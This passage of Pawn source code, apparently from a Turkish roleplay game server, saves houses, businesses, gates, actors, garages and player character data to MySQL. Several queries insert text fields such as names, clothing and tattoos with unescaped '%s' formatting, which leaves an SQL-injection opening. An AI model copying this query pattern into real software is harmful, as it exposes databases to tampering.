	Ev[evid][esahip],
	Ev[evid][girisX],
	Ev[evid][girisY],
	Ev[evid][girisZ],
	Ev[evid][egirisvw],
	Ev[evid][egirisint],
	Ev[evid][egirisangle],
	Ev[evid][cikisX],
	Ev[evid][cikisY],
	Ev[evid][cikisZ],
	Ev[evid][ecikisint],
	Ev[evid][ecikisvw],
	Ev[evid][ecikisangle],
	Ev[evid][efiyat],
	Ev[evid][ekilit],
	Ev[evid][eid]);
	mysql_tquery(1,query);

	mysql_format(1, query, sizeof(query), "UPDATE `evler` SET `intsure` = '%d', `intid` = '%d', `kira` = '%d', `kirafiyat` ='%d', `kiralayan` = '%d', `silah1` = '%d', `mermi1` = '%d', `silah2` = '%d', `mermi2` = '%d', `silah3` = '%d', `mermi3` = '%d', `birlikdestek` = '%d' WHERE `sqlid` = '%d'",
    Ev[evid][eintsure],
	Ev[evid][eintid],
	Ev[evid][kira],
	Ev[evid][kirafiyat],
	Ev[evid][kiralayan],
	Ev[evid][silah1],
	Ev[evid][mermi1],
	Ev[evid][silah2],
	Ev[evid][mermi2],
	Ev[evid][silah3],
	Ev[evid][mermi3],
	Ev[evid][birlikdestek],
	Ev[evid][eid]);
	mysql_tquery(1, query);

	if(Ev[evid][catigirisX] != 0) {
		mysql_format(1, query, sizeof(query), "UPDATE `evler` SET `catigiris` = '%f|%f|%f|%d|%d', `caticikis` = '%f|%f|%f|%d|%d' WHERE `sqlid` = '%d'",
		Ev[evid][catigirisX],
		Ev[evid][catigirisY],
		Ev[evid][catigirisZ],
		Ev[evid][catigirisint],
		Ev[evid][catigirisvw],
		Ev[evid][caticikisX],
		Ev[evid][caticikisY],
		Ev[evid][caticikisZ],
		Ev[evid][caticikisint],
		Ev[evid][caticikisvw],
		Ev[evid][eid]);
		mysql_tquery(1, query);
	}

	mysql_format(1, query, sizeof(query), "UPDATE `evler` SET `amfetamin` = '%d', `metamfetamin` = '%d', `lsd` = '%d', `extacy` ='%d', `eroin` = '%d', `kokain` = '%d', `morfin` = '%d', `uesrar` = '%d', `MDA` = '%d' WHERE `sqlid` = '%d'",
    EvUyusturucu[evid][amfetamin],
	EvUyusturucu[evid][metamfetamin],
	EvUyusturucu[evid][lsd],
	EvUyusturucu[evid][extacy],
	EvUyusturucu[evid][eroin],
	EvUyusturucu[evid][kokain],
	EvUyusturucu[evid][morfin],
	EvUyusturucu[evid][uesrar],
	EvUyusturucu[evid][MDA],
	Ev[evid][eid]);
	mysql_tquery(1, query);
}
stock IsyeriKaydet(isid)
{
	new query[400];
	mysql_format(1,query, sizeof(query), "UPDATE `isyerleri` SET `ad` = '%e', `isahip` = '%d', `girisx` = '%f', `girisy` = '%f', `girisz` = '%f', `girisvw` = '%d', `girisint` = '%d', `girisangle` = '%f', `cikisx` = '%f', `cikisy` = '%f', `cikisz` = '%f', `cikisint` = '%d', `cikisangle` = '%f' WHERE `sqlid` = '%d'",
	Isyeri[isid][iad],
	Isyeri[isid][isahip],
	Isyeri[isid][girisX],
	Isyeri[isid][girisY],
	Isyeri[isid][girisZ],
	Isyeri[isid][igirisvw],
	Isyeri[isid][igirisint],
	Isyeri[isid][girisangle],
	Isyeri[isid][cikisX],
	Isyeri[isid][cikisY],
	Isyeri[isid][cikisZ],
	Isyeri[isid][icikisint],
	Isyeri[isid][cikisangle],
	Isyeri[isid][iid]);
	mysql_tquery(1,query);
	mysql_format(1,query, sizeof(query),"UPDATE `isyerleri` SET `intid` = '%d', `intsure` = '%d',`fiyat` = '%d', `girisucreti` = '%d', `kasa` = '%d', `vergi` = '%d', `kilit` = '%d', `urun1` = '%e', `urun2` = '%e', `urun3` = '%e', `urun4` = '%e', `urun5` = '%e', `urun6` = '%e' WHERE `sqlid` = '%d'",
    Isyeri[isid][iintid],
	Isyeri[isid][iintsure],
	Isyeri[isid][ifiyat],
	Isyeri[isid][girisucreti],
	Isyeri[isid][ikasa],
	Isyeri[isid][ivergi],
	Isyeri[isid][ikilit],
	Isyeri[isid][urun1],
	Isyeri[isid][urun2],
	Isyeri[isid][urun3],
	Isyeri[isid][urun4],
	Isyeri[isid][urun5],
	Isyeri[isid][urun6],
	Isyeri[isid][iid]);
	mysql_tquery(1,query);

	mysql_format(1,query, sizeof(query), "UPDATE `isyerleri` SET `urun7` = '%e', `urun8` = '%e', `urun9` = '%e', `urun10` = '%e', `urunfiyat1` = '%d', `urunfiyat2` = '%d', `urunfiyat3` = '%d', `urunfiyat4` = '%d', `urunfiyat5` = '%d', `urunfiyat6` = '%d', `urunfiyat7` = '%d' WHERE `sqlid` = '%d'",
	Isyeri[isid][urun7],
	Isyeri[isid][urun8],
	Isyeri[isid][urun9],
	Isyeri[isid][urun10],
	Isyeri[isid][urunfiyat][0],
	Isyeri[isid][urunfiyat][1],
	Isyeri[isid][urunfiyat][2],
	Isyeri[isid][urunfiyat][3],
	Isyeri[isid][urunfiyat][4],
	Isyeri[isid][urunfiyat][5],
	Isyeri[isid][urunfiyat][6],
	Isyeri[isid][iid]);
	mysql_tquery(1,query);

	mysql_format(1,query, sizeof(query), "UPDATE `isyerleri` SET `urunfiyat8` = '%d', `urunfiyat9` = '%d', `urunfiyat10` = '%d', `yedekanahtar` = '%d', `ortak` = '%d', `tip` = '%d', `icikisvw` = '%d', `istok` = '%d', `karsilama` = '%e', `kira` = '%d', `kiralayan` = '%d', `kirafiyat` = '%d' WHERE `sqlid` = '%d'",
	Isyeri[isid][urunfiyat][7],
	Isyeri[isid][urunfiyat][8],
	Isyeri[isid][urunfiyat][9],
	Isyeri[isid][yedekanahtar],
	Isyeri[isid][ortak],
	Isyeri[isid][itip],
	Isyeri[isid][icikisvw],
	Isyeri[isid][istok],
	Isyeri[isid][karsilama],
	Isyeri[isid][kira],
	Isyeri[isid][kiralayan],
	Isyeri[isid][kirafiyat],
	Isyeri[isid][iid]);
	mysql_tquery(1,query);

	mysql_format(1,query, sizeof(query), "UPDATE `isyerleri` SET `isci1` = '%d', `isci2` = '%d', `isci3` = '%d', `isci4` = '%d', `isci5` = '%d', `isci6` = '%d', `isci7` = '%d', `isci8` = '%d', `isci9` = '%d', `isci10` = '%d', `muhurlu` = '%d', `iseviye` = '%d' WHERE `sqlid` = '%d'",
	Isyeri[isid][isci][0],
	Isyeri[isid][isci][1],
	Isyeri[isid][isci][2],
	Isyeri[isid][isci][3],
	Isyeri[isid][isci][4],
	Isyeri[isid][isci][5],
	Isyeri[isid][isci][6],
	Isyeri[isid][isci][7],
	Isyeri[isid][isci][8],
	Isyeri[isid][isci][9],
	Isyeri[isid][muhur],
	Isyeri[isid][iseviye],
	Isyeri[isid][iid]);
	mysql_tquery(1,query);

	mysql_format(1,query, sizeof(query), "UPDATE `isyerleri` SET `agirisx` = '%f', `agirisy` = '%f', `agirisz` = '%f', `agirisang` = '%f', `acikisx` = '%f', `acikisy` = '%f', `acikisz` = '%f', `acikisang` = '%f', `birlikdestek` = '%d' WHERE `sqlid` = '%d'",
	Isyeri[isid][agirisx],
	Isyeri[isid][agirisy],
	Isyeri[isid][agirisz],
	Isyeri[isid][agirisang],
	Isyeri[isid][acikisx],
	Isyeri[isid][acikisy],
	Isyeri[isid][acikisz],
	Isyeri[isid][acikisang],
	Isyeri[isid][birlikdestek],
	Isyeri[isid][iid]);
	mysql_tquery(1,query);

	if(Isyeri[isid][catigirisX] != 0) {
		mysql_format(1, query, sizeof(query), "UPDATE `isyerleri` SET `catigiris` = '%f|%f|%f|%d|%d', `caticikis` = '%f|%f|%f|%d|%d' WHERE `sqlid` = '%d'",
		Isyeri[isid][catigirisX],
		Isyeri[isid][catigirisY],
		Isyeri[isid][catigirisZ],
		Isyeri[isid][catigirisint],
		Isyeri[isid][catigirisvw],
		Isyeri[isid][caticikisX],
		Isyeri[isid][caticikisY],
		Isyeri[isid][caticikisZ],
		Isyeri[isid][caticikisint],
		Isyeri[isid][caticikisvw],
		Isyeri[isid][iid]);
		mysql_tquery(1, query);
	}
}

ATMKaydet(uyid)
{
	new query[256];
	format(query, sizeof(query), "UPDATE `atm` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f', `interior` = '%d', `vworld` = '%d' WHERE `id` = '%d'",
	ATM[uyid][atmx],
	ATM[uyid][atmy],
	ATM[uyid][atmz],
	ATM[uyid][atmrx],
	ATM[uyid][atmry],
	ATM[uyid][atmrz],
	ATM[uyid][atmint],
	ATM[uyid][atmvw],
	uyid);
	mysql_tquery(1,query);
}

UyusturucuKaydet(uyid)
{
	new query[400];
	format(query, sizeof(query), "UPDATE `uyusturucular` SET `tip` = '%d', `durum` = '%d', `dakika` = '%d', `x` = '%f', `y` = '%f', `z` = '%f', `interior` = '%d', `vworld` = '%d' WHERE `id` = '%d'",
	Uyusturucu[uyid][utip],
	Uyusturucu[uyid][udurum],
	Uyusturucu[uyid][udakika],
	Uyusturucu[uyid][ux],
	Uyusturucu[uyid][uy],
	Uyusturucu[uyid][uz],
	Uyusturucu[uyid][uinterior],
	Uyusturucu[uyid][uvworld],
	uyid);
	mysql_tquery(1,query);
}

MobilyaKaydet(MID)
{
	new query[400];
	format(query, sizeof(query), "UPDATE `mobilya` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f', `int` = '%d', `vw` = '%d' WHERE `id` = '%d'",
	Mobilya[MID][mx],
	Mobilya[MID][my],
	Mobilya[MID][mz],
	Mobilya[MID][mrx],
	Mobilya[MID][mry],
	Mobilya[MID][mrz],
	Mobilya[MID][mint],
	Mobilya[MID][mvw],
	Mobilya[MID][mid]);
	mysql_tquery(1, query);
	format(query, sizeof(query), "UPDATE `mobilya` SET `ox` = '%f', `oy` = '%f', `oz` = '%f', `orx` = '%f', `ory` = '%f', `orz` = '%f', `texture1` = '%d', `texture2` = '%d', `texturerenk1` = '%d', `texturerenk2` = '%d' WHERE `id` = '%d'",
	Mobilya[MID][mox],
	Mobilya[MID][moy],
	Mobilya[MID][moz],
	Mobilya[MID][morx],
	Mobilya[MID][mory],
	Mobilya[MID][morz],
	Mobilya[MID][mtexture][0],
	Mobilya[MID][mtexture][1],
	Mobilya[MID][mtexturerenk][0],
	Mobilya[MID][mtexturerenk][1],
	Mobilya[MID][mid]);
	mysql_tquery(1, query);
}

GateKaydet(MID)
{
	new query[400];
    format(query, sizeof(query), "UPDATE `gate` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f' WHERE `id` = '%d'",
	Gate[MID][gx],
	Gate[MID][gy],
	Gate[MID][gz],
	Gate[MID][grx],
	Gate[MID][gry],
	Gate[MID][grz],
	Gate[MID][gid]);
	mysql_tquery(1, query);
    format(query, sizeof(query), "UPDATE `gate` SET `ox` = '%f', `oy` = '%f', `oz` = '%f', `orx` = '%f', `ory` = '%f', `orz` = '%f' WHERE `id` = '%d'",
	Gate[MID][gox],
	Gate[MID][goy],
	Gate[MID][goz],
	Gate[MID][gorx],
	Gate[MID][gory],
	Gate[MID][gorz],
	Gate[MID][gid]);
	mysql_tquery(1, query);
	format(query, sizeof(query), "UPDATE `gate` SET `tmodel` = '%d', `tname1` = '%s', `tname2` = '%s', `model` = '%d', `int` = '%d', `vworld` = '%d', `sahip` = '%d', `birlik` = '%d' WHERE `id` = '%d'",
    Gate[MID][gtmodel],
    Gate[MID][gtname1],
    Gate[MID][gtname2],
	Gate[MID][gmodel],
	Gate[MID][gint],
	Gate[MID][gvw],
	Gate[MID][gsahip],
	Gate[MID][gbirlik],
	Gate[MID][gid]);
	mysql_tquery(1, query);
}

ActorKaydet(_aid)
{
	new query[400];
    format(query, sizeof(query), "UPDATE `actor` SET `x` = '%f', `y` = '%f', `z` = '%f', `rz` = '%f' , `vw` = '%d', `int` = '%d' WHERE `id` = '%d'",
	Actor[_aid][ax],
	Actor[_aid][aay],
	Actor[_aid][az],
	Actor[_aid][arz],
	Actor[_aid][avw],
	Actor[_aid][aint],
	Actor[_aid][aid]);
	mysql_tquery(1, query);
	format(query, sizeof(query), "UPDATE `actor` SET `isim` = '%s', `anim` = '%s', `skin` = '%d', `renk` = '%d' WHERE `id` = '%d'",
    Actor[_aid][aisim],
    Actor[_aid][aanim],
    Actor[_aid][askin],
	Actor[_aid][arenk],
	Actor[_aid][aid]);
	mysql_tquery(1, query);
}


ObjeKaydet(MID)
{
	new query[400];
    format(query, sizeof(query), "UPDATE `objeler` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f' WHERE `id` = '%d'",
	Obje[MID][ox],
	Obje[MID][oy],
	Obje[MID][oz],
	Obje[MID][orx],
	Obje[MID][ory],
	Obje[MID][orz],
	Obje[MID][oid]);
	mysql_tquery(1, query);
	format(query, sizeof(query), "UPDATE `objeler` SET `tmodel` = '%d', `tname1` = '%s', `tname2` = '%s', `model` = '%d', `int` = '%d', `vworld` = '%d' WHERE `id` = '%d'",
    Obje[MID][otmodel],
    Obje[MID][otname1],
    Obje[MID][otname2],
	Obje[MID][omodel],
	Obje[MID][oint],
	Obje[MID][ovw],
	Obje[MID][oid]);
	mysql_tquery(1, query);
}

AnkesorluTelefonKaydet(_id)
{
	new query[400];
    format(query, sizeof(query), "UPDATE `ankesortelefon` SET `x` = '%f', `y` = '%f', `z` = '%f', `rx` = '%f', `ry` = '%f', `rz` = '%f' WHERE `id` = '%d'",
	ATelefon[_id][a_x],
	ATelefon[_id][a_y],
	ATelefon[_id][a_z],
	ATelefon[_id][a_rx],
	ATelefon[_id][a_ry],
	ATelefon[_id][a_rz],
	ATelefon[_id][a_id]);
	mysql_tquery(1, query);
}

CCTVKaydet(CID)
{
	new query[400];
    format(query, sizeof(query), "UPDATE `cctv` SET `c_px` = '%f', `c_py` = '%f', `c_pz` = '%f', `c_rx` = '%f', `c_ry` = '%f', `c_rz` = '%f' WHERE `id` = '%d'",
	CCTV[CID][c_px],
	CCTV[CID][c_py],
	CCTV[CID][c_pz],
	CCTV[CID][c_rx],
	CCTV[CID][c_ry],
	CCTV[CID][c_rz],
	CCTV[CID][c_id]);
	mysql_tquery(1, query);
    format(query, sizeof(query), "UPDATE `cctv` SET `c_name` = '%s', `c_int` = '%d', `c_world` = '%d', `c_angle` = '%d' WHERE `id` = '%d'",
	CCTV[CID][c_name],
	CCTV[CID][c_int],
	CCTV[CID][c_vw],
	CCTV[CID][c_angle],
	CCTV[CID][c_id]);
	mysql_tquery(1, query);
}

GarajKaydet(id)
{
	new query[400];
    format(query, sizeof(query), "UPDATE `garajlar` SET `x` = '%f', `y` = '%f', `z` = '%f', `int` = '%d', `vw` = '%d', `interior` = '%d' WHERE `id` = '%d'",
    Garaj[id][gx],
    Garaj[id][gy],
    Garaj[id][gz],
    Garaj[id][gint],
    Garaj[id][gvw],
    Garaj[id][gicint],
	Garaj[id][gid]);
	mysql_tquery(1, query);
	format(query, sizeof(query), "UPDATE `garajlar` SET `ax` = '%f', `ay` = '%f', `az` = '%f', `arz` = '%f', `sahip` = '%d', `birlik` = '%d', `isim` = '%s', `kilit` = '%d' WHERE `id` = '%d'",
    Garaj[id][gax],
    Garaj[id][gay],
    Garaj[id][gaz],
    Garaj[id][garz],
    Garaj[id][gsahip],
    Garaj[id][gbirlik],
    Garaj[id][gisim],
    Garaj[id][gkilit],
	Garaj[id][gid]);
	mysql_tquery(1, query);
}

KarakterKaydet(playerid)//oyuncukaydet
{
	if(IsPlayerConnected(playerid) && Girdi[playerid])
	{
	    new Float:health, Float:armour, Float:x, Float:y, Float:z;
	    GetPlayerHealth(playerid, health);
	    GetPlayerArmour(playerid, armour);
	    Karakter[playerid][hp] = health;
	    Karakter[playerid][armor] = armour;
	    GetPlayerPos(playerid, x, y, z);
	    Karakter[playerid][posx] = x;
	    Karakter[playerid][posy] = y;
	    Karakter[playerid][posz] = z;
	    Karakter[playerid][interior] = GetPlayerInterior(playerid);
	    Karakter[playerid][vworld] = GetPlayerVirtualWorld(playerid);

        new query[512];
	    mysql_format(1,query, sizeof(query), "UPDATE `karakterler` SET `level` = '%d', `para` = '%d', `skin` = '%d', `hp` = '%f', `armor` = '%f' WHERE `id` = '%d'",
		Karakter[playerid][level],
		Karakter[playerid][para],
		Karakter[playerid][skin],
		Karakter[playerid][hp],
		Karakter[playerid][armor],
		Karakter[playerid][sqlid]);
		mysql_tquery(1,query);

		if(GetPVarInt(playerid, "PosKaydetme") != 1)
		{
		    if(!gTvIzliyo[playerid] && !GetPVarInt(playerid, "InAirsoft"))
		    {
				mysql_format(1, query, sizeof(query), "UPDATE `karakterler` SET `posx` = '%f', `posy` = '%f', `posz` = '%f', `interior` = '%d', `vworld` = '%d' WHERE `id` = '%d'",
				Karakter[playerid][posx],
				Karakter[playerid][posy],
				Karakter[playerid][posz],
				Karakter[playerid][interior],
				Karakter[playerid][vworld],
				Karakter[playerid][sqlid]);
				mysql_tquery(1,query);
			}
			else if(GetPVarInt(playerid, "InAirsoft")) {
				mysql_format(1, query, sizeof(query), "UPDATE `karakterler` SET `posx` = '%f', `posy` = '%f', `posz` = '%f', `interior` = '0', `vworld` = '0' WHERE `id` = '%d'",
				AIRSOFT_POS_X,
				AIRSOFT_POS_Y,
				AIRSOFT_POS_Z,
				Karakter[playerid][sqlid]);
				mysql_tquery(1,query);
			}
			else if(gTvIzliyo[playerid])
			{
			    mysql_format(1, query, sizeof(query), "UPDATE `karakterler` SET `posx` = '%f', `posy` = '%f', `posz` = '%f', `interior` = '%d', `vworld` = '%d' WHERE `id` = '%d'",
				gTx[playerid],
				gTy[playerid],
				gTz[playerid],
				gTint[playerid],
				gTvw[playerid],
				Karakter[playerid][sqlid]);
				mysql_tquery(1,query);
			}
		}

		mysql_format(1,query, sizeof(query), "UPDATE `karakterler` SET `cezaneden` = '%s' WHERE `id` = '%d'",
		Karakter[playerid][cezaneden],
		Karakter[playerid][sqlid]);
		mysql_tquery(1,query);

		mysql_format(1,query, sizeof(query), "UPDATE `karakterler` SET `kimlikno` = '%d', `yas` = '%d', `cinsiyet` = '%d', `uyruk` = '%d', `adminlevel` = '%d', `kilit` = '%d', `ck` = '%d', `chatstili` = '%d', `esrar` = '%d', `mantar` = '%d', `hammantar` = '%d', `usaksi` = '%d', `esrartohum` = '%d', `birlik` = '%d', `rutbe` = '%d', `kodes` = '%d', `ajail` = '%d', `ceza` = '%d' WHERE `id` = '%d'",
		Karakter[playerid][kimlikno],
		Karakter[playerid][yas],
		Karakter[playerid][cinsiyet],
		Karakter[playerid][uyruk],
		Karakter[playerid][adminlevel],
		Karakter[playerid][kilit],
		Karakter[playerid][ck],
		Karakter[playerid][chatstili],
		Karakter[playerid][uesrar],
		Karakter[playerid][umantar],
		Karakter[playerid][hammantar],
		Karakter[playerid][usaksi],
		Karakter[playerid][esrartohum],
		Karakter[playerid][birlik],
		Karakter[playerid][rutbe],
		Karakter[playerid][kodes],
		Karakter[playerid][ajail],
		Karakter[playerid][ceza],
		Karakter[playerid][sqlid]);
		mysql_tquery(1,query);

		format(query, sizeof(query), "UPDATE `karakterler` SET `amfetamin` = '%d', `metamfetamin` = '%d', `lsd` = '%d', `extacy` = '%d', `eroin` ='%d', `kokain` = '%d', `morfin` = '%d', `MDA` = '%d', `boy`  = '%d', `kilo` = '%d', `sacrenk` = '%d', `gozrenk` = '%d', `telno` = '%d', `isbasi` = '%d' WHERE `id` = '%d'",
		Karakter[playerid][amfetamin],
		Karakter[playerid][metamfetamin],
		Karakter[playerid][lsd],
		Karakter[playerid][extacy],
		Karakter[playerid][eroin],
		Karakter[playerid][kokain],
		Karakter[playerid][morfin],
		Karakter[playerid][MDA],
		Karakter[playerid][boy],
		Karakter[playerid][kilo],
		Karakter[playerid][sacrenk],
		Karakter[playerid][gozrenk],
		Karakter[playerid][telno],
		Karakter[playerid][isbasi],
		Karakter[playerid][sqlid]);
		mysql_tquery(1,query);

		format(query, sizeof(query), "UPDATE `karakterler` SET `isbasiskin` = '%d', `exp` = '%d', `hesapno` = '%d', `savings` = '%d', `paydakika` = '%d', `maske` = '%d', `maskeno` = '%d', `meslek` = '%d', `balik` = '%d', `yem` = '%d', `olta` = '%d', `tester` = '%d', `sigara` = '%d', `sonx` = '%f', `sony` = '%f', `sonz` = '%f', `sonvw` = '%d', `sonint` = '%d' WHERE `id` = '%d'",
		Karakter[playerid][isbasiskin],
		Karakter[playerid][exp],
		Karakter[playerid][hesapno],
		Karakter[playerid][savings],
		Karakter[playerid][payday],
		Karakter[playerid][maske],
		Karakter[playerid][maskeno],
		Karakter[playerid][meslek],
		Karakter[playerid][balik],
		Karakter[playerid][yem],
		Karakter[playerid][olta],
		Karakter[playerid][tester],
		Karakter[playerid][sigara],
		Karakter[playerid][sonx],
		Karakter[playerid][sony],
		Karakter[playerid][sonz],
		Karakter[playerid][sonvw],
		Karakter[playerid][sonint],
		Karakter[playerid][sqlid]);
		mysql_tquery(1,query);

		format(query, sizeof(query), "UPDATE `karakterler` SET `galeri` = '%d', `ssgaleri` = '%d', `telsiz` = '%d', `frekans` = '%d', `dilsure` = '%d', `kanama` = '%d', `bagimlimi` = '%d', `krizgeldimi` = '%d', `utedavidurum` = '%d', `aclik` = '%d', `susuzluk` = '%d', `tuvalet` = '%d', `anick` = '%s', `askin` = '%d', `ehliyet` = '%d', `kasseviye` = '%d', `kaspuan` = '%d', `grup` = '%d', `gps` = '%d' WHERE `id` = '%d'",
        Karakter[playerid][galeri],
		Karakter[playerid][ssgaleri],
		Karakter[playerid][telsiz],
		Karakter[playerid][frekans],
		Karakter[playerid][dilsure],
        Karakter[playerid][kanama],
		Karakter[playerid][bagimlimi],
		Karakter[playerid][krizgeldimi],
		Karakter[playerid][utedavidurum],
		Karakter[playerid][aclik],
		Karakter[playerid][susuzluk],
		Karakter[playerid][tuvalet],
		Karakter[playerid][anick],
		Karakter[playerid][askin],
		Karakter[playerid][ehliyet],
		Karakter[playerid][kasseviye],
		Karakter[playerid][kaspuan],
		Karakter[playerid][grup],
		Karakter[playerid][pGPS],
		Karakter[playerid][sqlid]);
		mysql_tquery(1, query);

		format(query, sizeof(query), "UPDATE `karakterler` SET `gengelle` = '%d', `box` = '%d', `kungfu` = '%d', `kneehead` = '%d', `grabkick` = '%d', `elbow` = '%d', `dovussure` = '%d', `kassure` = '%d', `matA` = '%d', `matB` = '%d', `matC` = '%d', `matD` = '%d', `matE` = '%d', `kokaintohum` = '%d', `erointohum` = '%d', `kiyafetler` = '%s', `benzinbidon` = '%f', `bidon` = '%d', `tezgah` = '%d' WHERE `id` = '%d'",
        Karakter[playerid][gengelle],
		Karakter[playerid][box],
		Karakter[playerid][kungfu],
		Karakter[playerid][kneehead],
		Karakter[playerid][grabkick],
		Karakter[playerid][elbow],
		Karakter[playerid][dovusure],
		Karakter[playerid][kassure],
		Karakter[playerid][matA],
		Karakter[playerid][matB],
		Karakter[playerid][matC],
		Karakter[playerid][matD],
		Karakter[playerid][matE],
		Karakter[playerid][kokaintohum],
		Karakter[playerid][erointohum],
		Karakter[playerid][kiyafetler],
		Karakter[playerid][benzinbidon],
		Karakter[playerid][bidon],
		Karakter[playerid][tezgah],
		Karakter[playerid][sqlid]);
		mysql_tquery(1, query);

		format(query, sizeof(query), "UPDATE `karakterler` SET `soygunsure` = '%d', `sruhsat` = '%d', `sruhsat2` = '%d', `rozetno` = '%d', `yem1` = '%d', `yem2` = '%d', `yem3` = '%d', `medisbasi` = '%d', `fdisbasi` = '%d', `sisbasi` = '%d', `dil` = '%d', `unlu` = '%d', `alm` = '%d', `arp` = '%d', `cin` = '%d', `fra` = '%d', `isp` = '%d', `ita` = '%d', `japon` = '%d', `rus` = '%d' WHERE `id` = '%d'",
        Karakter[playerid][soygunsure],
        Karakter[playerid][sruhsat],
		Karakter[playerid][sruhsat2],
		Karakter[playerid][rozetno],
		Karakter[playerid][yemmiktar][1],
		Karakter[playerid][yemmiktar][2],
		Karakter[playerid][yemmiktar][3],
		Karakter[playerid][medisbasi],
		Karakter[playerid][fdisbasi],
		Karakter[playerid][sisbasi],
		Karakter[playerid][dil],
		Karakter[playerid][unlu],
		Karakter[playerid][alm],
		Karakter[playerid][arp],
		Karakter[playerid][cin],
		Karakter[playerid][fra],
		Karakter[playerid][isp],
		Karakter[playerid][ita],
		Karakter[playerid][japon],
		Karakter[playerid][rus],
		Karakter[playerid][sqlid]);
        mysql_tquery(1, query);

        format(query, sizeof(query), "UPDATE `karakterler` SET `slovak` = '%d', `ermen` = '%d', `yunan` = '%d', `ibra` = '%d', `irlan` = '%d', `porte` = '%d', `sirp` = '%d', `arnavut` = '%d', `ciu` = '%d', `uyari` = '%d', `saglikrapor` = '%d', `temizrapor` = '%d', `surucusinav` = '%d', `notdefteri` = '%d', `dovme` = '%s', `guvenlikdurumu` = '0', `banka` = '%d', `oyunsure` = '%d', `oydurum` = '%d', `deaglealdi` = '%d', `pistolaldi` = '%d' WHERE `id` = '%d'",
		Karakter[playerid][slovak],
		Karakter[playerid][ermen],
		Karakter[playerid][yunan],
		Karakter[playerid][ibra],
		Karakter[playerid][irlan],
		Karakter[playerid][porte],
		Karakter[playerid][sirp],
		Karakter[playerid][arnavut],
		Karakter[playerid][ciu],
		Karakter[playerid][uyari],
		Karakter[playerid][saglikrapor],
		Karakter[playerid][temizrapor],
		Karakter[playerid][surucusinav],
		Karakter[playerid][notdefteri],
		Karakter[playerid][dovme],
		Karakter[playerid][banka],
		Karakter[playerid][oyunsure],
		Karakter[playerid][oydurum],
		Karakter[playerid][deaglealdi],
		Karakter[playerid][pistolaldi],
		Karakter[playerid][sqlid]);
        mysql_tquery(1, query);

        format(query, sizeof(query), "UPDATE `karakterler` SET `ozellik` = '%d', `liderlik` = '%d', `guc` = '%d', `pazarlik` = '%d', `ustalik` = '%d', `silahpayday` = '%d', `silahuretimid` = '%d', `avukat` = '%d', `denizlisans` = '%d', `havalisans` = '%d' WHERE `id` = '%d'",
        Karakter[playerid][ozellik],
		KarakterOzellik[playerid][Liderlik],
		KarakterOzellik[playerid][Guc],
		KarakterOzellik[playerid][Pazarlik],
		KarakterOzellik[playerid][Ustalik],
		Karakter[playerid][silahpayday],
		Karakter[playerid][silahuretimid],
		Karakter[playerid][avukat],
		Karakter[playerid][denizlisans],
		Karakter[playerid][havalisans],
		Karakter[playerid][sqlid]);
        mysql_tquery(1, query);

		new mtext[20];
		new year, month,day;
		getdate(year, month, day);
		if(month == 1) { mtext = "Ocak"; }
		else if(month == 2) { mtext = "Subat"; }
		else if(month == 3) { mtext = "Mart"; }
		else if(month == 4) { mtext = "Nisan"; }
		else if(month == 5) { mtext = "Mayis"; }
		else if(month == 6) { mtext = "Haziran"; }
		else if(month == 7) { mtext = "Temmuz"; }
		else if(month == 8) { mtext = "Agustos"; }
		else if(month == 9) { mtext = "Eylul"; }
		else if(month == 10) { mtext = "Ekim"; }
		else if(month == 11) { mtext = "Kasim"; }
		else if(month == 12) { mtext = "Aralik"; }
		new hour,minuite,second;
		gettime(hour,minuite,second);
		new _mstring[512];
		format(_mstring, sizeof(_mstring), "%d %s %d - %d:%d", day,mtext,year,hour,minuite);
		if(minuite < 10) format(_mstring, sizeof(_mstring), "%d %s %d - %d:0%d", day,mtext,year,hour,minuite);
        if(hour < 10) format(_mstring, sizeof(_mstring), "%d %s %d - 0%d:%d", day,mtext,year,hour,minuite);
        if(minuite < 10 && hour < 10) format(_mstring, sizeof(_mstring), "%d %s %d - 0%d:0%d", day,mtext,year,hour,minuite);
        format(query, sizeof(query), "UPDATE `karakterler` SET `songiris` = '%s' WHERE `id` = '%d'",
        _mstring,
        Karakter[playerid][sqlid]);
        mysql_tquery(1, query);

		//RehberKaydet(playerid);
	}
}

ClearScreen(playerid)
{
	for(new i; i<25; i++)
	{
	    SendClientMessage(playerid, -1, "");
	}
}
stock TextBol(const strsrc[], strdest[][], delimiter)
{
	static _i;
	for(new i;i<strlen(strsrc);i++)
	{
	    if(strsrc[i] == ' ')
	    {
	        if(i >= delimiter || i >= strlen(strsrc))
	        {
	            _i = i;
	            break;
	        }
	    }
	}
	strmid(strdest[0], strsrc, 0, strlen(strsrc), 128);
	strdel(strdest[0], _i, strlen(strsrc));
	strmid(strdest[1], strsrc, 0, strlen(strsrc), 128);
	strdel(strdest[1], 0, _i);
	return 1;
}

stock strtok(const string[], &index,seperator=' ')
{
	new length = strlen(string);
	new offset = index;
	new result[128];
	while ((index < length) && (string[index] != seperator) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}

	result[index - offset] = EOS;
	if ((index < length) && (string[index] == seperator))
	{
		index++;
	}
	return result;
}
stock ReturnUser(text[], playerid = INVALID_PLAYER_ID)
{
	new pos = 0;
	while (text[pos] < 0x21) // Strip out leading spaces
	{
		if (text[pos] == 0) return INVALID_PLAYER_ID; // No passed text
		pos++;
	}
	new userid = INVALID_PLAYER_ID;
	if (IsNumeric(text[pos])) // Check whole passed string
	{
		// If they have a numeric name you have a problem (although names are checked on id failure)
		userid = strval(text[pos]);
		if(IsPlayerConnected(userid))
		{
		return userid; // A player was found
		}else{
		return SQLtoID(userid);
		}
		// Removed for fallthrough code
	}
	// They entered [part of] a name or the id search failed (check names just incase)
	new len = strlen(text[pos]);
	new count = 0;
	new name[MAX_PLAYER_NAME];
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
			GetPlayerName(i, name, sizeof (name));
			if (strcmp(name, text[pos], true, len) == 0) // Check segment of name
			{
				if (len == strlen(name)) // Exact match
				{
					return i; // Return the exact player on an exact match
					// Otherwise if there are two players:
					// Me and MeYou any time you entered Me it would find both
					// And never be able to return just Me's id
				}
				else // Partial match
				{
					count++;
					userid = i;
				}
			}
		}
	}
	if (count != 1)
	{
